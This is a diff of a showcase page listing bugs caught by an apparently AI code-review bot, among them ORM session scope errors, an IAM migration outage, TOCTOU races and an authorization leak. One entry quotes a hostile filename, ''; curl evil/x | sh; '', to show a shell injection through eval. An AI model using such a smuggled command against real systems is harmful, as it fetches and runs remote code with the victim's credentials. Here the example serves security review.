@@ -2,11 +2,59 @@
 
 A small gallery of reviews where knightwatch caught something genuinely non-obvious — the kind of failure mode a careful human reader would have shipped.
 
-Each entry links to the original review comment, embeds a screenshot of what the bot posted, and explains why the catch matters. Ordered from most to least impressive.
+Each entry links to the original review comment, embeds a screenshot of what the bot posted, and explains why the catch matters. Ordered from most to least impressive. The first three are real production catches in [`cncorp/plow`](https://github.com/cncorp/plow) where the author (`@plonkus`) accepted and shipped the fix; the rest are catches the bot made on its own repo.
 
 ---
 
-## 1. Shell injection via `eval` of PR-controlled filenames
+## 1. `connector_used` middleware silently drops events on real auth routes
+
+**Review:** [cncorp/plow#544 — DetachedInstance on `user.channels`](https://github.com/cncorp/plow/pull/544#issuecomment-4340939339) · *fix confirmed in [follow-up review](https://github.com/cncorp/plow/pull/544#issuecomment-4345823886)*
+
+![plow#544 — connector_used middleware DetachedInstance](examples/plow544-connector-used.png)
+
+A new PostHog `connector_used` event passes the test suite but would silently fail in production. The bot traced the bug across five sources:
+
+- `main.py` — middleware runs *after* `call_next` returns, so the request-scoped SQLAlchemy session is already closed
+- `auth.py` — `lookup_session()` only preloads the `user` row, not `user.channels`
+- `analytics.py` — the `$set` payload then dereferences `user.channels`, triggering `DetachedInstanceError`
+- `connectors/gmail/calendar_router.py` — the live Calendar route never triggers preload elsewhere
+- `test_connector_used_middleware.py` — the existing test masks the bug because it injects a synthetic `request.state.auth_user` with channels prepopulated
+
+Plonkus fixed it via a `lookup_session` preload + a real-auth e2e test in `test_auth.py`; the next review confirmed *"the detached-session `connector_used` failure is fixed."*
+
+Why it tops the list: simulating ASGI middleware lifecycle + ORM session scope + payload dereference + route preload semantics + test fixture shape — five layers, none of them visible in any single file, and the test suite actively hides the bug.
+
+---
+
+## 2. IAM rollout would crash the API at startup via Alembic
+
+**Review:** [cncorp/plow#487 — Alembic bypasses the IAM hook](https://github.com/cncorp/plow/pull/487#issuecomment-4322608935) · *fix confirmed in [follow-up review](https://github.com/cncorp/plow/pull/487#issuecomment-4331628884)*
+
+![plow#487 — IAM Alembic startup outage](examples/plow487-iam-alembic.png)
+
+The PR wires `DB_IAM_AUTH=true` into `db/session.py`'s async engine — but the bot caught that the rollout would actually take prod down. The container's `start.sh` runs `alembic upgrade head` *before* Uvicorn, and `alembic/env.py` builds a plain `create_engine(get_url())` without the IAM hook (which only lives in `build_async_engine`). Combined with `terraform/locals.tf`/`ecs.tf` removing `DB_PASSWORD`, the migration step would crash trying passwordless auth as `plow_app` and the API would never boot.
+
+Plonkus fixed by reusing `get_sync_connection()` from Alembic. Follow-up review: *"Reusing `get_sync_connection(...)` from Alembic is the right seam: the migration path and runtime path now obtain credentials the same way."*
+
+Why impressive: the bug is invisible from any single file — the deploy mechanic (Terraform env + `start.sh` ordering) is what makes the otherwise-fine async-only hook a production-down change. Predicting a rollout-time outage from cross-stack evidence (shell + Terraform + Python entry points + the location of the IAM hook) is genuinely senior-level review.
+
+---
+
+## 3. VM-loss probe vs plowd's canonical reader disagree on stale ports
+
+**Review:** [cncorp/plow#552 — Phoenix probe reads stale port as live](https://github.com/cncorp/plow/pull/552#issuecomment-4349574160) · *fix shipped in commit `4ebe3098`, [confirmed by plonkus](https://github.com/cncorp/plow/pull/552#issuecomment-4354093632)*
+
+![plow#552 — VM-loss probe stale-port mismatch](examples/plow552-vm-probe.png)
+
+Phoenix's Swift VM-loss probe in `DaemonClient.swift` reads the system container's persisted `port` as evidence the VM is alive. But plowd's canonical reader in `plowd/container_registry.py` only treats the port as live when the container is `enabled` *AND* `running`. Because `startContainer()` writes `.starting` *before* the guest listens, and `stopContainer()` writes `.stopped` without clearing the port, `fetchStatus()` would see a stale port for 25 seconds and incorrectly restart the runtime as "VM instance lost."
+
+Plonkus fixed by routing the probe through `ContainerRegistry` instead of `ServiceURLs.gatewayPort()`: *"the VM-loss probe in `DaemonClient` no longer calls `ServiceURLs.gatewayPort()` — it now looks up the system container's allocated port via `ContainerRegistry`."*
+
+Why impressive: the bug only emerges from the *interaction* between two languages' state-machine interpretations of the same on-disk JSON, plus the precise timing of when status-write side effects happen relative to guest readiness. Cross-stack reasoning of this shape is rare even from senior reviewers.
+
+---
+
+## 4. Shell injection via `eval` of PR-controlled filenames
 
 **Review:** [knightwatch-reviewer#25 — `dead-code-eval`](https://github.com/srosro/knightwatch-reviewer/pull/25#issuecomment-4350469713)
 
@@ -14,11 +62,11 @@ Each entry links to the original review comment, embeds a screenshot of what the
 
 The new dead-code specialist runs detection commands assembled from filenames inside the PR's diff, then passes the assembled string through `eval` in `DEAD_CODE_CMDS`. The bot caught that a filename like `'; curl evil/x | sh; '` would execute on the reviewer's host with its `gh` credentials and local repo access.
 
-Why it tops the list: this is direct RCE on the reviewer's host with full GitHub auth. The catch is non-obvious because the *outer* command (`grep`, `find`) looks safe — the injection seam is in the substring being interpolated, which only matters once you trace the data path back to PR-controlled filenames.
+Why impressive: this is direct RCE on the reviewer's host with full GitHub auth. The catch is non-obvious because the *outer* command (`grep`, `find`) looks safe — the injection seam is in the substring being interpolated, which only matters once you trace the data path back to PR-controlled filenames.
 
 ---
 
-## 2. TOCTOU rewriting `origin/<default_branch>` mid-review
+## 5. TOCTOU rewriting `origin/<default_branch>` mid-review
 
 **Review:** [knightwatch-reviewer#29 — `.knightwatch` config TOCTOU](https://github.com/srosro/knightwatch-reviewer/pull/29#issuecomment-4357168423)
 
@@ -30,7 +78,7 @@ Multi-step trust-boundary bypass: timing window + git capability + assumed-immut
 
 ---
 
-## 3. `PrivateTmp=yes` defeating `/tmp` cross-tick locks
+## 6. `PrivateTmp=yes` defeating `/tmp` cross-tick locks
 
 **Review:** [knightwatch-reviewer#18 — detached workers + PrivateTmp](https://github.com/srosro/knightwatch-reviewer/pull/18#issuecomment-4346528399)
 
@@ -42,7 +90,7 @@ Result: two workers can launch concurrently for the same PR and `rm -rf` each ot
 
 ---
 
-## 4. `git clone --shared` silently losing the base ref
+## 7. `git clone --shared` silently losing the base ref
 
 **Review:** [knightwatch-reviewer#36 — non-default-base PRs lose `origin/<base>`](https://github.com/srosro/knightwatch-reviewer/pull/36#issuecomment-4359749179)
 
@@ -54,19 +102,19 @@ So in the per-PR workdir, `origin/<BASE_REF>` is silently absent, the diff snaps
 
 ---
 
-## 5. Cross-repo search authorization leak
+## 8. Cross-repo search authorization leak
 
 **Review:** [knightwatch-reviewer#25 — `cross-repo-search-trust`](https://github.com/srosro/knightwatch-reviewer/pull/25#issuecomment-4350469713)
 
 ![PR #25 — cross-repo search auth leak](examples/03-pr25-cross-repo-leak.png)
 
-A separate finding inside the same review body as #1: the dead-code specialist greps across canonical's local clones, which share an object database with sibling repos. Authorization is checked only against the *reviewed* repo, not against each sibling whose lines might be returned.
+A separate finding inside the same review body as #4: the dead-code specialist greps across canonical's local clones, which share an object database with sibling repos. Authorization is checked only against the *reviewed* repo, not against each sibling whose lines might be returned.
 
 A collaborator with access to repo A could cause private sibling-repo B's paths and lines to be quoted into A's review. Classic confused-deputy across what looks like one trust boundary but is actually two.
 
 ---
 
-## 6. Aborted aggregator outputs staged as prior reviews
+## 9. Aborted aggregator outputs staged as prior reviews
 
 **Review:** [knightwatch-reviewer#15 — `prior-reviews.md` from aborted runs](https://github.com/srosro/knightwatch-reviewer/pull/15#issuecomment-4344887837)
 
@@ -78,7 +126,7 @@ Result: a truncated, half-rendered aggregator dump becomes the canonical "previo
 
 ---
 
-## 7. Substring-triggered `/srosro-approve` approvals
+## 10. Substring-triggered `/srosro-approve` approvals
 
 **Review:** [knightwatch-reviewer#14 — `is_approve_request` substring match](https://github.com/srosro/knightwatch-reviewer/pull/14#issuecomment-4344404933)
 
@@ -90,7 +138,7 @@ A substring-vs-command-parse mismatch with real production blast radius — a si
 
 ---
 
-## 8. Merge-from-main hunks miscredited as branch-authored
+## 11. Merge-from-main hunks miscredited as branch-authored
 
 **Review:** [knightwatch-reviewer#28 — review-scope diff includes upstream hunks](https://github.com/srosro/knightwatch-reviewer/pull/28#issuecomment-4356784178)
 
@@ -98,4 +146,4 @@ A substring-vs-command-parse mismatch with real production blast radius — a si
 
 The review-scope diff (`git diff base..head`) includes hunks the PR author never touched if they merged main and the merge brought along upstream changes to the same files. Those hunks were getting attributed to the PR author in findings.
 
-A fairness regression: the bot would blame an author for code they only inherited via a merge. Real, but the easiest of the eight to spot once you sit down and think carefully about diff-base semantics — which is why it lands at the bottom of this list.
+A fairness regression: the bot would blame an author for code they only inherited via a merge. Real, but the easiest of the eleven to spot once you sit down and think carefully about diff-base semantics — which is why it lands at the bottom of this list.
